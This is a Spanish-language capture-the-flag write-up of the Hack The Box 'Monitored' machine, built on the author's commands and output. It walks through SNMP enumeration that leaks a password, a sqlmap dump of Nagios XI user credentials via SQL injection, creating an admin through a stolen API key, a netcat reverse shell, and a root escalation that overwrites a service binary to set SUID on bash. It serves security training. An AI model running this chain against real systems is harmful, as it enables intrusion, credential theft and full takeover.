# Monitored

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/cd96ae19-ff86-4d11-8f6e-2285bd4900aa)

***
- Source: https://app.hackthebox.com/machines/Monitored
- OS: Linux
- Dificultad: Medium
- IP: 10.10.11.241
- Temas: `API enumeration`, `CVE`, `SNMP`. `SQL Injection`, `service explotation`, `sudo`.
***

- Realizamos un escaneo de puertos:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Monitored]
└─$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV monitored.htb  
[sudo] contraseña para kali: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-26 17:01 EST
NSE: Loaded 46 scripts for scanning.
Initiating SYN Stealth Scan at 17:01
Scanning monitored.htb (10.10.11.248) [65535 ports]
Discovered open port 443/tcp on 10.10.11.248
Discovered open port 22/tcp on 10.10.11.248
Discovered open port 80/tcp on 10.10.11.248
Discovered open port 5667/tcp on 10.10.11.248
Discovered open port 389/tcp on 10.10.11.248
Completed SYN Stealth Scan at 17:02, 15.61s elapsed (65535 total ports)
Initiating Service scan at 17:02
Scanning 5 services on monitored.htb (10.10.11.248)
Completed Service scan at 17:02, 14.00s elapsed (5 services on 1 host)
NSE: Script scanning 10.10.11.248.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 17:02
Completed NSE at 17:02, 2.96s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 17:02
Completed NSE at 17:02, 4.45s elapsed
Nmap scan report for monitored.htb (10.10.11.248)
Host is up, received user-set (0.24s latency).
Scanned at 2024-02-26 17:01:59 EST for 38s
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp   open  http       syn-ack ttl 63 Apache httpd 2.4.56
389/tcp  open  ldap       syn-ack ttl 63 OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   syn-ack ttl 63 Apache httpd 2.4.56
5667/tcp open  tcpwrapped syn-ack ttl 63
Service Info: Hosts: nagios.monitored.htb, 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.40 seconds
           Raw packets sent: 75822 (3.336MB) | Rcvd: 74906 (2.996MB)
~~~

- Si seguimos la URL del puerto 80, veremos un login:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/270c95de-9020-4fc2-b4ed-a2fbcf4dd562)

- Como no hay nada interesante a simple vista, haremos un fuzzeo de directorios:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Monitored]
└─$ gobuster dir -u https://monitored.htb/nagiosxi -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 --add-slash --no-error -k 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://monitored.htb/nagiosxi
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images/              (Status: 403) [Size: 279]
/help/                (Status: 302) [Size: 27] [--> https://monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/help/index.php%3f&noauth=1]                                                             
/about/               (Status: 200) [Size: 18068]
/tools/               (Status: 302) [Size: 27] [--> https://monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/tools/index.php%3f&noauth=1]                                                            
/mobile/              (Status: 302) [Size: 0] [--> https://monitored.htb/nagiosxi/mobile/views/login.php]                                                                                               
/admin/               (Status: 302) [Size: 27] [--> https://monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/admin/index.php%3f&noauth=1]                                                            
/reports/             (Status: 302) [Size: 27] [--> https://monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/reports/index.php%3f&noauth=1]                                                          
/account/             (Status: 302) [Size: 27] [--> https://monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/account/index.php%3f&noauth=1]                                                          
/includes/            (Status: 403) [Size: 279]
/backend/             (Status: 200) [Size: 108]
/db/                  (Status: 403) [Size: 279]
/api/                 (Status: 403) [Size: 279]
/config/              (Status: 302) [Size: 27] [--> https://monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/config/index.php%3f&noauth=1]                                                           
/views/               (Status: 302) [Size: 27] [--> https://monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/views/index.php%3f&noauth=1]                                                            
/sounds/              (Status: 403) [Size: 279]
/terminal/            (Status: 200) [Size: 5215]
~~~

- Hay una terminal, pero nos pide loguearnos así que supongo que es un rabbit hole.
- Enumeraremos la api, a ver si encontramos algo interesante, como versiones, etc:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Monitored]
└─$ gobuster dir -u https://monitored.htb/nagiosxi/api -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 --add-slash --no-error -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://monitored.htb/nagiosxi/api
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/includes/            (Status: 403) [Size: 279]
/v1/                  (Status: 200) [Size: 32]
~~~

- Hay una versión `v1`, seguimos fuzzeando en esta ruta:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Monitored]
└─$ gobuster dir -u https://monitored.htb/nagiosxi/api/v1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 --add-slash --no-error -k --exclude-length 32
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://monitored.htb/nagiosxi/api/v1
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          32
[+] User Agent:              gobuster/3.6
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/license/             (Status: 200) [Size: 34]
/%20/                 (Status: 403) [Size: 279]
/authenticate/        (Status: 200) [Size: 53]
/video games/         (Status: 403) [Size: 279]
/spyware doctor/      (Status: 403) [Size: 279]
/4%20Color%2099%20IT2/ (Status: 403) [Size: 279]
/nero 7/              (Status: 403) [Size: 279]
/long distance/       (Status: 403) [Size: 279]
/cable tv/            (Status: 403) [Size: 279]
/cell phones/         (Status: 403) [Size: 279]
/windows xp/          (Status: 403) [Size: 279]
/DVD Tools/           (Status: 403) [Size: 279]
~~~

- Hay varias rutas, en realidad nos toma como bueno todo lo que tenga espacios, así que solo tomaremos `license` y `authenticate`.
- Aquí no pude hacer nada, porque la api nos solicitaba autenticación.
- Escaneamos UDP, porque no encontré nada más:

~~~bash
┌──(root👹Dedsec)-[/home/kali]
└─# nmap -sU -p- -Pn -n --open --min-rate 2000 monitored.htb -vvv
Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-26 18:26 EST
Initiating UDP Scan at 18:26
Scanning monitored.htb (10.10.11.248) [65535 ports]
Increasing send delay for 10.10.11.248 from 0 to 50 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.11.248 from 50 to 100 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.11.248 from 100 to 200 due to max_successful_tryno increase to 6
Increasing send delay for 10.10.11.248 from 200 to 400 due to max_successful_tryno increase to 7
Increasing send delay for 10.10.11.248 from 400 to 800 due to max_successful_tryno increase to 8
Increasing send delay for 10.10.11.248 from 800 to 1000 due to max_successful_tryno increase to 9
Warning: 10.10.11.248 giving up on port because retransmission cap hit (10).
UDP Scan Timing: About 8.51% done; ETC: 18:32 (0:05:33 remaining)
Discovered open port 161/udp on 10.10.11.248
UDP Scan Timing: About 16.86% done; ETC: 18:32 (0:05:01 remaining)
UDP Scan Timing: About 25.21% done; ETC: 18:32 (0:04:30 remaining)
UDP Scan Timing: About 33.56% done; ETC: 18:32 (0:04:00 remaining)
UDP Scan Timing: About 41.92% done; ETC: 18:32 (0:03:29 remaining)
Discovered open port 123/udp on 10.10.11.248
UDP Scan Timing: About 50.28% done; ETC: 18:32 (0:02:59 remaining)
UDP Scan Timing: About 58.63% done; ETC: 18:32 (0:02:29 remaining)
UDP Scan Timing: About 66.99% done; ETC: 18:32 (0:01:59 remaining)
UDP Scan Timing: About 75.34% done; ETC: 18:32 (0:01:29 remaining)
~~~

- Tenemos dos puertos, el escaneo tarda demasiado, así que decidí enumerar solo estos dos:

~~~bash
┌──(root👹Dedsec)-[/home/kali]
└─# nmap -sU -Pn monitored.htb -p161,123 -sV
Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-26 18:35 EST
Nmap scan report for monitored.htb (10.10.11.248)
Host is up (0.38s latency).

PORT    STATE SERVICE VERSION
123/udp open  ntp     NTP v4 (unsynchronized)
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
Service Info: Host: monitored

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds
~~~

- Enumeré el servicio de `snmp` con `snmpwalk` y encontré una contraseña, cabe destacar que el escaneo tomó alrededor de 20 minutos:

~~~bash
┌──(kali💀Dedsec)-[~]
└─$ snmpwalk -v 1 -c public monitored.htb 

<------ TRASH ------>

iso.3.6.1.2.1.25.4.2.1.5.418 = STRING: "--config /etc/laurel/config.toml"
iso.3.6.1.2.1.25.4.2.1.5.524 = ""
iso.3.6.1.2.1.25.4.2.1.5.537 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.538 = STRING: "--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only"
iso.3.6.1.2.1.25.4.2.1.5.540 = STRING: "-n -iNONE"
iso.3.6.1.2.1.25.4.2.1.5.541 = ""
iso.3.6.1.2.1.25.4.2.1.5.542 = STRING: "-u -s -O /run/wpa_supplicant"
iso.3.6.1.2.1.25.4.2.1.5.549 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.557 = STRING: "-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB "
~~~

- Passwd: `svc`:`XjH7VCehowpR1xZB`

- Con estas credenciales, podemos loguearnos en la api y obtener un access token:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Monitored]
└─$ curl -s -X POST 'https://monitored.htb/nagiosxi/api/v1/authenticate/' -k -d "username=svc&password=XjH7VCehowpR1xZB"         
{"username":"svc","user_id":"2","auth_token":"7245f8b158a1bc02ac774cc5849a17fd7df346b3","valid_min":5,"valid_until":"Mon, 26 Feb 2024 19:39:24 -0500"}
~~~

- Pude loguearme con el parámetro que indicaba la [documentación](https://www.nagios.org/ncpa/help/2.0/api.html), en este caso probé con otra ruta, ya que me hizo más sentido que `login.php` tuviera parámetros.

~~~url
https://monitored.htb/nagiosxi/login.php?token=<token>
~~~

- Podemos ver el panel, en realidad no hay mucho que observar.
- Tenemos una versión `Nagios XI 5.11.0 `.
- Encontré un [exploit](https://medium.com/@n1ghtcr4wl3r/nagios-xi-vulnerability-cve-2023-40931-sql-injection-in-banner-ace8258c5567) para esta versión, basada en una inyección SQL.
- Ejecutamos ``sqlmap`` en la ruta indicada y con los parametros por defecto que tiene la base de datos:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Monitored]
└─$ sqlmap -u "https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=$(curl -s -X POST 'https://monitored.htb/nagiosxi/api/v1/authenticate/' -k -d "username=svc&password=XjH7VCehowpR1xZB" | grep -oP '"user_id":"2","auth_token":"\K[^"]*')" --level 5 --risk 3 -p id --batch -D nagiosxi -T xi_users --dump
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.2.1#dev}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:55:00 /2024-02-27/

<------ TRASH ------>

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=acknowledge_banner_message&id=3 AND (SELECT 3938 FROM (SELECT(SLEEP(5)))cYfI)&token=d17fb7e57b78ca3290c8ccf05df0fb5479b20915
---
[19:27:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.56
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[19:27:38] [INFO] fetching columns for table 'xi_users' in database 'nagiosxi'
[19:27:42] [INFO] retrieved: 'user_id'
[19:27:43] [INFO] retrieved: 'int(11)'
[19:27:45] [INFO] retrieved: 'username'
[19:27:47] [INFO] retrieved: 'varchar(255)'
[19:27:49] [INFO] retrieved: 'password'
[19:27:50] [INFO] retrieved: 'varchar(128)'
[19:27:52] [INFO] retrieved: 'name'
[19:27:54] [INFO] retrieved: 'varchar(100)'
[19:27:56] [INFO] retrieved: 'email'
[19:27:58] [INFO] retrieved: 'varchar(128)'
[19:28:00] [INFO] retrieved: 'backend_ticket'
[19:28:02] [INFO] retrieved: 'varchar(128)'
[19:28:04] [INFO] retrieved: 'enabled'
[19:28:06] [INFO] retrieved: 'smallint(6)'
[19:28:08] [INFO] retrieved: 'api_key'
[19:28:10] [INFO] retrieved: 'varchar(128)'
[19:28:12] [INFO] retrieved: 'api_enabled'
[19:28:14] [INFO] retrieved: 'smallint(6)'
[19:28:16] [INFO] retrieved: 'login_attempts'
[19:28:18] [INFO] retrieved: 'smallint(6)'
[19:28:20] [INFO] retrieved: 'last_attempt'
[19:28:21] [INFO] retrieved: 'int(11)'
[19:28:23] [INFO] retrieved: 'last_password_change'
[19:28:25] [INFO] retrieved: 'int(11)'
[19:28:27] [INFO] retrieved: 'last_login'
[19:28:29] [INFO] retrieved: 'int(11)'
[19:28:31] [INFO] retrieved: 'last_edited'
[19:28:33] [INFO] retrieved: 'int(11)'
[19:28:35] [INFO] retrieved: 'last_edited_by'
[19:28:37] [INFO] retrieved: 'int(11)'
[19:28:38] [INFO] retrieved: 'created_by'
[19:28:40] [INFO] retrieved: 'int(11)'
[19:28:42] [INFO] retrieved: 'created_time'
[19:28:44] [INFO] retrieved: 'int(11)'
[19:28:44] [INFO] fetching entries for table 'xi_users' in database 'nagiosxi'
[19:28:48] [INFO] retrieved: 'Nagios Administrator'
[19:28:49] [INFO] retrieved: '1'
[19:28:53] [INFO] retrieved: 'IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7...
[19:28:55] [INFO] retrieved: 'IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0'
[19:28:57] [INFO] retrieved: '0'
[19:28:58] [INFO] retrieved: '0'
[19:29:00] [INFO] retrieved: 'admin@monitored.htb'
[19:29:02] [INFO] retrieved: '1'
[19:29:04] [INFO] retrieved: '0'
[19:29:05] [INFO] retrieved: '1701427555'
[19:29:07] [INFO] retrieved: '5'
[19:29:09] [INFO] retrieved: '1701931372'
[19:29:11] [INFO] retrieved: '1701427555'
[19:29:13] [INFO] retrieved: '0'
[19:29:16] [INFO] retrieved: '$2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0...
[19:29:18] [INFO] retrieved: '1'
[19:29:20] [INFO] retrieved: 'nagiosadmin'
[19:29:22] [INFO] retrieved: 'svc'
[19:29:24] [INFO] retrieved: '1'
[19:29:28] [INFO] retrieved: '2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVl...
[19:29:32] [INFO] retrieved: '6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYp...
[19:29:34] [INFO] retrieved: '1'
[19:29:36] [INFO] retrieved: '1699634403'
[19:29:38] [INFO] retrieved: 'svc@monitored.htb'
[19:29:40] [INFO] retrieved: '0'
[19:29:42] [INFO] retrieved: '1699730174'
[19:29:44] [INFO] retrieved: '1699728200'
[19:29:46] [INFO] retrieved: '1'
[19:29:48] [INFO] retrieved: '1699724476'
[19:29:50] [INFO] retrieved: '1699697433'
[19:29:52] [INFO] retrieved: '3'

<------ TRASH ------>
~~~

- Tenemos dos valores importantes para admin, un hash `$2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0` y un token `IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL`.
- Es unitil intentar romper el hash, así que podemos emplear el token para crear un usuario con permisos de administrador. 
- En este [paper](https://support.nagios.com/forum/viewtopic.php?f=16&t=42923) se nos dice como crear un usuario desde la api.
- Encontré otro [documento](https://support.nagios.com/forum/viewtopic.php?p=276220) que nos indica como crear un usuario con nivel de autenticación de administrador.
- Creamos un usuario con credenciales `hacker:hacker`:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Monitored]
└─$ curl -X POST 'https://monitored.htb/nagiosxi//api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1' -d "username=hacker&password=hacker&name=hacker_test&email=hacker@monitored.htb&auth_level=admin" -k
{
    "success": "User account hacker was added successfully!",
    "user_id": 6
}
~~~

- Siguiendo estos pasos, obtenemos una `api key`, con un usuario creado con permisos de admin:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Monitored]
└─$ curl -s -X POST 'https://monitored.htb/nagiosxi/api/v1/authenticate/' -k -d "username=hacker&password=hacker"    
{"username":"hacker","user_id":"6","auth_token":"2f4de36301fc4f0bb16c2c9a5bfceae5fdba9d65","valid_min":5,"valid_until":"Tue, 27 Feb 2024 20:14:30 -0500"}
~~~

- Y nos logueamos como este usuario visitando `https://monitored.htb/nagiosxi/login.php?token=<token>`, reemplazando nuestro token por el recién obtenido.
- Por configuración, se nos pedirá ingresar una nueva contraseña (usaremos ``1234567``):

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/2d1bf2f8-528f-4004-b29a-31679bc9f201)

- Una vez en el panel de autenticación, nos dirigimos a `Advanced Configuration`:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/1fa022a8-48c6-44fa-bc23-9dd5f35b6f29)

- Entramos al apartado de ``commands``:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/1bbb4a67-5c0e-4ccc-84b4-a775e8bc984b)

- Podemos ver algunos existentes, pero crearemos el nuestro:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/8bf1a302-90d9-4add-a3d5-b9f9d13a02d5)

- Creamos uno, añadiendo una revshell en este.
- **SPOILER**: Probé con varias, pero solo me funcionó la de `netcat`:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/e9e467d9-f423-4aca-8a1e-d545dd089b1e)

- Presionamos aplicar configuración:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/869850b3-ac63-4753-bafd-3beddb24a56f)

- Ahora nos vamos a ``Service management`` y seleccionamos el comando revshell en un servicio que ya exista, cambiando el comando por uno nuestro:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/752ec0f8-2880-48d6-96c9-602f47a0be9d)

- Si presionamos `run command`, y nos ponemos en escucha desde nuestra máquina, deberíamos ganar acceso y obtener la primera flag:

~~~bash
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.47] from (UNKNOWN) [10.10.11.248] 34672
whoami
nagios
ls
cookie.txt
user.txt
cat user.txt
883741a1f225651c975d204b491698de
~~~

- Hacemos una sanitización de la TTY:

~~~bash
script /dev/null -c bash
^Z
stty size
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 44 columns 184
~~~

***
***

### PrivEsc

- Verifiqué los permisos que teníamos para ejecutar con sudo:

~~~bash
nagios@monitored:~$ sudo -l
Matching Defaults entries for nagios on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nagios may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/migrate/migrate.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
~~~

- Revisé todos los archivos en los que podíamos ejecutar parámetros, no vi nada sospechoso excepto en `/usr/local/nagiosxi/scripts/manage_services.sh`.
- Aquí, podemos usar como parámetros cualquiera de estas cosas, por lo que podemos detener, iniciar, resetear, o inspeccionar ciertos servicios:

~~~bash
# Things you can do
first=("start" "stop" "restart" "status" "reload" "checkconfig" "enable" "disable")
second=("postgresql" "httpd" "mysqld" "nagios" "ndo2db" "npcd" "snmptt" "ntpd" "crond" "shellinaboxd" "snmptrapd" "php-fpm")
~~~

- Metí los servicios a un archivo ``txt``, y que más son los servicios sino binarios.
- Hice una búsqueda recursiva para ver si alguno tenía permisos de escritura, pues si es así, podemos detener el servicio en cuestión, eliminarlo, y crear otro:

~~~bash
bash-5.1$ while read -r bins; do find / -writable -name *"$bins"* 2>/dev/null; done < bins2w.txt | grep bin
/usr/local/nagios/bin/nagios
/usr/local/nagios/bin/nagiostats
/usr/local/nagios/bin/npcd.save
/usr/local/nagios/bin/npcd
/usr/local/nagios/bin/npcdmod.o
/usr/local/nagiosxi/html/includes/components/nxti/includes/snmptrap-bins/snmpttconvertmib
~~~

- Tenemos dos binarios que aparecen, `nagios` y `npcd`.
- Podemos revisar los permisos de estos, y en efecto podemos escribir sobre estos:

~~~bash
bash-5.1$ ls -la /usr/local/nagios/bin/nagios
-rwxrwxr-- 1 nagios nagios 717648 Nov  9 10:40 /usr/local/nagios/bin/nagios
bash-5.1$ ls -la /usr/local/nagios/bin/npcd
-rwxr-xr-x 1 nagios nagios 75 Feb 28 06:35 /usr/local/nagios/bin/npcd
~~~

- Utilizaré el binario de `nagios` para esta prueba.
- Detenemos el servicio:

~~~bash
bash-5.1$ sudo /usr/local/nagiosxi/scripts/manage_services.sh stop nagios
~~~

- Borramos y creamos un nuevo binario de ``nagios``, asignándole los mismos permisos que tenía previamente:

~~~bash
bash-5.1$ rm /usr/local/nagios/bin/nagios
bash-5.1$ ls -la /usr/local/nagios/bin/nagios
ls: cannot access '/usr/local/nagios/bin/nagios': No such file or directory
bash-5.1$ nano /usr/local/nagios/bin/nagios
bash-5.1$ cat /usr/local/nagios/bin/nagios
#!/bin/bash
chmod u+s /bin/bash
bash-5.1$ chmod 774 /usr/local/nagios/bin/nagios
~~~~

- Iniciamos el servicio nuevamente, y deberíamos tener una bash SUID:

~~~bash
bash-5.1$ sudo /usr/local/nagiosxi/scripts/manage_services.sh start nagios
Job for nagios.service failed because the control process exited with error code.
See "systemctl status nagios.service" and "journalctl -xe" for details.
bash-5.1$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
~~~

- Ejecutamos la bash privilegiada y ya seríamos root:

~~~bash
bash-5.1$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
bash-5.1$ /bin/bash -p
bash-5.1# whoami
root
bash-5.1# cd /root
bash-5.1# cat root.txt 
3ee53a655ab0ec462cb44d0d559d1b12
~~~

- Esta máquina fue bastante divertida, pone en practica elementos vitales como la enumeración de APIs, de manera retadora y práctica.
- Creditos a [Hamibubu 🐧](https://github.com/Hamibubu), con quien resolví esta máquina en conjunto :).
